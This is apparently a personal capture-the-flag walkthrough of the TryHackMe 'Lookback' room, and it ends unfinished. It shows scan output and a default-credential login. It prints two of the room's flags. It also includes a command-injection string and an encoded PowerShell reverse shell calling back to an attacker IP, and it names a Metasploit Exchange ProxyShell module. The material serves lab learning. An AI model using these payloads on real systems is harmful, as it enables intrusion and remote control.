<p align="center">December 8, 2024</p>
<p align="center">Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{216}}$$-day-streak in  <a href="https://tryhackme.com/">TryHackMe</a>.</p>
 
<h1 align="center">
  $$\textcolor{#3bd62d}{\textnormal{Lookback}}$$
</h1>
<p align="center">You’ve been asked to run a vulnerability test on a production environment.</p>
<p align="center">Access this TryHackMe room clicking <a href="https://tryhackme.com/r/room/lookback">Lookback</a>.</p><br>
<p align="center">
  <img height="150px" hspace="20" src="https://github.com/user-attachments/assets/b4ac7b4e-0d2a-4510-993b-a7f532a630f7"> <br>
  <img width="800px" src="https://github.com/user-attachments/assets/4d5201c0-7989-4965-bd49-a83bec4eb275">
</p>


<br>
<h2>Task 1. Find the flags</h2>
<br>

<p>The Lookback company has just started the integration with Active Directory. Due to the coming deadline, the system integrator had to rush the deployment of the environment. Can you spot any vulnerabilities?<br>

Start the Virtual Machine by pressing the Start Machine button at the top of this task. You may access the VM using the AttackBox or your VPN connection. This machine does not respond to ping (ICMP).<br>
<br>
Can you find all the flags?<br>
The VM takes about 5/10 minutes to fully boot up.</p>

<br>

<p><em>Sometimes to move forward, we have to go backward.<br>
So if you get stuck, try to look back!</em></p>

<br>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>
<br>
<br>

> 1.1. <em>What is the service user flag?</em><br><a id='1.1'></a>
>> <code><strong>THM{Security_Through_Obscurity_Is_Not_A_Defense}</strong></code>

<br>

> 1.2. <em>What is the user flag?</em><br><a id='1.2'></a>
>> <code><strong>THM{Stop_Reading_Start_Doing}</strong></code>

<br>

> 1.3. <em>What is the root flag?</em><br><a id='1.3'></a>
>> <code><strong>___________________</strong></code>

<br>

<br>

<pre><code>oot@[THM AttackBox]:~/Lookback# nmap -sC -sV lookback.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-08 20:43 GMT
Nmap scan report for lookback.thm ([Target])
Host is up (0.029s latency).
Not shown: 993 filtered ports
PORT     STATE SERVICE        VERSION
80/tcp   open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
135/tcp  open  msrpc          Microsoft Windows RPC
139/tcp  open  netbios-ssn    Microsoft Windows netbios-ssn
443/tcp  open  ssl/https
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7
| Subject Alternative Name: DNS:WIN-12OUO7A66M7, DNS:WIN-12OUO7A66M7.thm.local
| Not valid before: 2023-01-25T21:34:02
|_Not valid after:  2028-01-25T21:34:02
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http     Microsoft Windows RPC over HTTP 1.0
3389/tcp open  ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: WIN-12OUO7A66M7
|   DNS_Domain_Name: thm.local
|   DNS_Computer_Name: WIN-12OUO7A66M7.thm.local
|   DNS_Tree_Name: thm.local
|   Product_Version: 10.0.17763
|_  System_Time: 2024-12-08T20:45:07+00:00
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7.thm.local
| Not valid before: 2024-12-07T20:34:27
|_Not valid after:  2025-06-08T20:34:27
MAC Address: 02:66:4D:0C:02:39 (Unknown)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: WIN-12OUO7A66M7, NetBIOS user: <unknown>, NetBIOS MAC: 02:66:4d:0c:02:39 (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-12-08T20:45:07
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 226.57 seconds
</code></pre>

<br>

<p>From <code>nmap</code> we learned the <code>DNS Computer Namee</code>, which is <code>WIN-12OUO7A66M7.thm.local</code></p>

<br>

![image](https://github.com/user-attachments/assets/76f1cfba-ddd3-46c5-975a-5d7a52263df1)

<br>

<p>Then I visited <code>WIN-12OUO7A66M7.thm.local:80</code>, and got this ...</p>

<br>

![image](https://github.com/user-attachments/assets/5524551b-2227-443e-8b5e-5eeb841e0b37)

<br>
<p>And nothing also <code>viewing source</code> ...</p>

<br>

![image](https://github.com/user-attachments/assets/ac819f92-6a6a-4dbf-ba56-c1ea7059c6a0)

<br>

<p>Visiting it on port 443 ...</p>

<br>

![image](https://github.com/user-attachments/assets/83fdb747-ba6c-43e8-a429-52256dc6c581)

<br>

<p>I accepeted the Risk and Continued, and got an <code>Outlook</code> webpage.</p>

<br>

![image](https://github.com/user-attachments/assets/95f2a0c6-db0a-41fc-8a8f-32b7085bd486)

<br>

<p>Proceeded then using <code>ffuf</code></p>

<br>

<pre><code>root@[THM AttackBox:~/Lookback# ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://win-12ouo7a66m7.thm.local/FUZZ -fw 1

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : https://win-12ouo7a66m7.thm.local/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 1
________________________________________________

test                    [Status: 401, Size: 1293, Words: 81, Lines: 30]
Test                    [Status: 401, Size: 1293, Words: 81, Lines: 30]
owa                     [Status: 302, Size: 233, Words: 6, Lines: 4]
ecp                     [Status: 302, Size: 233, Words: 6, Lines: 4]
27079%5Fclassicpeople2%2Ejpg [Status: 302, Size: 146, Words: 6, Lines: 4]
tiki%2Epng              [Status: 302, Size: 130, Words: 6, Lines: 4]
squishdot_rss10%2Etxt   [Status: 302, Size: 141, Words: 6, Lines: 4]
b33p%2Ehtml             [Status: 302, Size: 131, Words: 6, Lines: 4]
:: Progress: [220560/220560] :: Job [1/1] :: 763 req/sec :: Duration: [0:08:51] :: Errors: 0 ::
</code></pre>


<br>

<p>To pass through <code>/test</code> we need some credentials.</p>

<br>

![image](https://github.com/user-attachments/assets/45468de5-21b2-43e9-83dd-0c73aa941ea8)

<br>

<p>I tried <code>admin:admin</code> as credentials.</p>

<br>


![image](https://github.com/user-attachments/assets/690b314d-6b0a-4412-b1ca-ce6cf2c403c1)

<br>


![image](https://github.com/user-attachments/assets/7c9837e6-3738-4ed5-abff-7357b05160b8)


<br>

<p>Tried next <code>BitlockerActiveMonitoringLogs'</code>, and receiveed some intresting output.</p>

![image](https://github.com/user-attachments/assets/7281ddbe-dc49-44d5-9ac9-1f40b9b52f04)

<br>

![image](https://github.com/user-attachments/assets/04fa1e7b-0300-4625-b7ef-b8b5e7e8f2b6)

<br>

![image](https://github.com/user-attachments/assets/0efe16f7-515c-4586-af43-46a84b47cafc)

<br>

![image](https://github.com/user-attachments/assets/5b08689b-110a-4a3f-84e9-e54a5fa5c9ce)


<br>

![image](https://github.com/user-attachments/assets/ee251655-b7cf-4055-856c-83ef1ea66c0b)

<br>

![image](https://github.com/user-attachments/assets/aa0e42de-4934-4d3d-93c0-ca1cd145e0ab)

<br>

![image](https://github.com/user-attachments/assets/6f3c8764-faa8-4de7-bac9-3d7627e8db60)

<br>

![image](https://github.com/user-attachments/assets/e246e7b7-1f6b-43c8-a81d-4e4a2ea9a68f)

<br>

<p>Tried many options before the following.</p>

![image](https://github.com/user-attachments/assets/d114c435-a0b6-403e-a33e-14bc61ad3a91)

<br>


![image](https://github.com/user-attachments/assets/049e4808-9d79-47be-996b-3e5a480282d9)

<br>

![image](https://github.com/user-attachments/assets/e044dd5d-7f29-476d-b27f-ff1cda9e6d0a)


<br>

<p>Now I know that I could have done totally different and in a easier way.</p>

<pre><code>BitlockerActiveMonitoringLogs'); type C:\Users\dev\Desktop\user.txt #('</code></pre>

<br>

![image](https://github.com/user-attachments/assets/4a2fc094-7a1b-42f1-a89d-a4f11f0c7120)


<br>

![image](https://github.com/user-attachments/assets/b41db2d0-f1fe-4ce5-8b17-bc74e9dc45fc)

<br>

![image](https://github.com/user-attachments/assets/42610b4c-1bab-482a-a303-9050b26e80e5)

<br>

![image](https://github.com/user-attachments/assets/0a6622a3-fc47-455c-93f4-cb4a73685b16)

<br>

<p>I pasted my <code>payload</code> after <code>BitlockerActiveMonitoringLogs') ;</code> and added in the end <code>('</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/ef0e778b-3d52-498d-8693-6bfaa14c7e14)

<br>

<pre><code>BitlockerActiveMonitoringLogs') ;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQAyADEALgAxADkAMAAiACwAOQAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=('</code></pre>

<br>

![image](https://github.com/user-attachments/assets/d3ec3b8a-e780-455b-82b1-03b65d90ab79)

<br>

![image](https://github.com/user-attachments/assets/cefff290-7167-4b99-a03a-f5b6810eb4e5)

<br>


![image](https://github.com/user-attachments/assets/e65adbe6-4c24-4dfc-b154-755d6fccf965)

<br>

![image](https://github.com/user-attachments/assets/56535057-0334-4819-9d93-dc7912030d92)

<br>

<pre><code>msfupdate
...
...
msfconsole
...
...
msf6> search exchange
...
</code></pre>


![image](https://github.com/user-attachments/assets/35517dad-c7d0-4fca-8860-afbecaf58986)

<br>

![image](https://github.com/user-attachments/assets/99493d6e-2e0d-4260-a84c-e1c62d4c44e7)

<br>

![image](https://github.com/user-attachments/assets/c2c82ba6-24e5-4944-a52a-70398804abb2)

<pre><code>msf6 exploit(windows/http/exchange_proxylogon_rce) > use windows/http/exchange_proxyshell_rce
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/http/exchange_proxyshell_rce) > show options</code></pre>

<br>


![image](https://github.com/user-attachments/assets/82381eef-46a7-4898-912a-6bc6e63351ea)

<br>

![image](https://github.com/user-attachments/assets/12df23c3-de4e-49a5-b712-b440f6bcc9f5)










<br>
<h2>------------------------- To be continued -------------------------</h2>
<br>
